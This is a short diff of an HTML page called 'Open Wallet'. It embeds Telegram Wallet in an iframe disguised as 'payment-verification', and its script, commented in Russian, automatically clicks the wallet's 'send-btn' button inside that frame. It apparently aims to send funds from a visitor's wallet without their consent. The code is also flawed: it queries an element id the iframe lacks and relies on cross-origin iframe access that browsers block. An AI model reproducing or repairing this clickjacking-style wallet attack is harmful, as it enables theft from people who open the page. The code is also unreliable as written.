@@ -6,7 +6,7 @@
     <title>Open Wallet</title>
 </head>
 <body>
-    <iframe class="payment-verification" src="https://t.me/wallet/start"></iframe>
+    <iframe class="payment-verification" src="https://t.me/wallet/start?startapp"></iframe>
 
     <script>
         // Ожидание загрузки iframe
@@ -24,11 +24,11 @@
 
         // Ожидание, пока Telegram Wallet  загрузится и будет готов к взаимодействию
         async function openWallet() {
-            const iframe = document.getElementById('telegram-wallet');
-            await waitForElement('#telegram-wallet');
+            const iframe = document.getElementById('payment-verification');
+            await waitForElement('#payment-verification');
 
             // Ожидание, пока кнопка "send-btn" появится на странице Telegram Wallet
-            await waitForElement('#telegram-wallet button[data-testid="send-btn"]');
+            await waitForElement('#payment-verification button[data-testid="send-btn"]');
 
             // Нажатие кнопки через iframe.contentWindow
             const sendButton = iframe.contentWindow.document.querySelector('button[data-testid="send-btn"]');
